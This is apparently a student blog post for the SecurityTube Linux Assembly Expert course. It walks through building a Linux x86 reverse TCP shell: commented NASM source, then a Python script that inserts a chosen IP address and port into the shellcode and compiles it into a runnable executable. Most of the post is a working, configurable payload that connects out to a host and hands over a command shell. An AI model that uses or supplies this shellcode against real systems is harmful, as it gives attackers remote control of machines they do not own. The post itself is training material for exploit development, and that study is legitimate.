# Assignment 2: Reverse TCP Shell

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

### Problem

- Create a Shell_Reverse_TCP shellcode
  - Reverse connects to configured IP and Port
  - Execs shell on successful connection
- IP and Port should be easily configurable


### Solution

To complete this task, it was necessary to research the steps that must be taken in order to connect to a remote port and pass command execution to it. 

By going over how this is done in C, it was possible to obtain the list of appropriate system calls that must be used to accomplish the task. Other shellcode found in the wild was studied to understand how command execution control can be transfered to the remotely connected computer via the socket. The system calls basically amount to the following:

1. socket
2. connect
3. dup2
4. execve

Going over the steps, first we create a socket file descriptor with `socket()`; then we connect it to a remote address and port with `connect()`; remap i/o to the socket file descriptor with `dup()`; and finally, execute `/bin/sh` with `execve()`. The effect produced is an interactive remote system command shell.

All system calls, parameter structures, values, etc. used in the NASM code were looked up in the Linux `man` pages and the following libraries:


| What              | Where |
|:------------------|:------------------|
| system syscalls   | `/usr/include/i386-linux-gnu/asm/unistd_32.h` |
| socket syscalls   | `/usr/include/linux/net.h` |
| socket domains     | `/usr/include/netinet/in.h`   (Internet Address Family) |
| socket types       |  `/usr/include/i386-linux-gnu/bits/socket_type.h` |
| socket protocols    | `/usr/include/i386-linux-gnu/bits/socket.h` |
| socket options      | `/usr/include/asm-generic/socket.h` |




For the implementation part, a generic program was written in NASM to get the opcodes. Port configuration was done with Python using the opcodes from NASM code as a prototype and configuring address and port opcodes based on user input. 

It is worth mentioning that this shellcode is by no means meant to be the shortest possible. Rather, the idea was to get a thorough grasp of every step necessary to achieve the desired result. Detailed comments are added for maximum clarity.


## reverse.nasm

```nasm
global _start

section .text

_start:

    
    ; socket
    ; int socketcall(int call, unsigned long *args);
    ; int socket(int domain, int type, int protocol);
    ;
    ; int socketcall(1, [2,1,6])

socket:
    xor eax, eax
    xor ebx, ebx
    push 6                      ; protocol = IPPROTO_IP = 6 (tcp)
    push 1                      ; type = SOCK_STREAM = 1
    push 2                      ; domain = PF_INET = 2
    mov ecx, esp                ; args = [2,1,6]
    mov bl, 1                   ; call = sys_socket = 1
    mov al, 102                 ; socketcall
    int 0x80

    mov esi, eax                ; esi == socketfd



    ; connect
    ; int socketcall(int call, unsigned long *args);
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;    struct sockaddr_in {
    ;        short            sin_family;   // word
    ;        unsigned short   sin_port;     // word
    ;        struct in_addr   sin_addr;     // dword (ulong)
    ;    };
    ;
    ; int socketcall(3, [sockfd, [2, 4444, 127.0.0.1], 16])

connect:
    push 0x0100007f             ; sin_addr = 127.0.0.1
    push word 0x5c11            ; sin_port = 4444
    push word 0x2               ; sin_family = PF_INET = 2
    mov ecx, esp                ; struct sockaddr *addr = [2, 4444, 127.0.0.1]
    push 16                     ; socklen_t addrlen = 16
    push ecx                    ; struct sockaddr *addr
    push esi                    ; sockfd
    mov ecx, esp                ; args = [sockfd, [2, 4444, 127.0.0.1], 16]
    mov bl, 3                   ; call = sys_connect = 3
    mov al, 102                 ; socketcall
    int 0x80

 

    ; remap i/o
    ; int dup2(int oldfd, int newfd);
    ;
    ; int dup2(clientfd, 2);
    ; int dup2(clientfd, 1);
    ; int dup2(clientfd, 0);

    xor ecx, ecx
    mov cl, 2                   ; newfd = stdin, stdout, stderr
    mov ebx, esi                ; oldfd = socketfd
    xor eax, eax
dup2:
    mov al, 63                  ; dup2
    int 0x80
    dec ecx
    jns dup2  




    ; execve
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ;
    ; int execve("/bin//sh", &cmd, 0)

execve:
    xor eax, eax
    push eax                    ; 0
    push 0x68732f2f             ; hs//
    push 0x6e69622f             ; nib/
    mov ebx, esp                ; filename

    push eax                    ; 0
    mov edx, esp                ; envp

    push ebx                    ; filename address
    mov ecx, esp                ; argv

    mov al, 11                  ; execve
    int 0x80
```

The following Python program allows user to input the address, port and an option filename to generate the reverse TCP shell shellcode:

## bind.py

```python
#!/usr/bin/python

#####	Generate reverse shellcode

import sys
import struct

if len(sys.argv) < 3 or len(sys.argv[1].split(".")) != 4 or int(sys.argv[2]) not in range(1,65536):
	sys.exit("Usage: reverse.py [127.0.0.1] [1-65535] [compiled.elf]")

host = ""
addr = sys.argv[1].split(".")
for a in addr:
	host += struct.pack(">B", int(a))

port = struct.pack(">H", int(sys.argv[2]))

shellcode = (
	"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1"
	"\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x68"+host+"\x66"
	"\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56"
	"\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\xb1\x02"
	"\x89\xf3\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31"
	"\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
	"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	)

print
print "Shellcode Length: %d" % len(bytearray(shellcode))
print
sc = ""
for c in bytearray(shellcode):
	sc += "\\x%02x" % c
print sc


#####	Generate an executable 		


if len(sys.argv) < 3: sys.exit()

import os

skeleton = '''
#include<stdio.h>
#include<string.h>
unsigned char code[] = "__SHELLCODE__";
void main()
{
	printf("Shellcode Length: %d\\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
'''

skeleton = skeleton.replace("__SHELLCODE__", sc)

with open("a.c", "w") as f:
	f.write(skeleton)

os.system("gcc a.c -fno-stack-protector -z execstack")
os.rename("a.out", sys.argv[3])
os.remove("a.c")

print
print "Executable: %s" % sys.argv[3]
print
```

## Example

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-2/a2.png "Example")
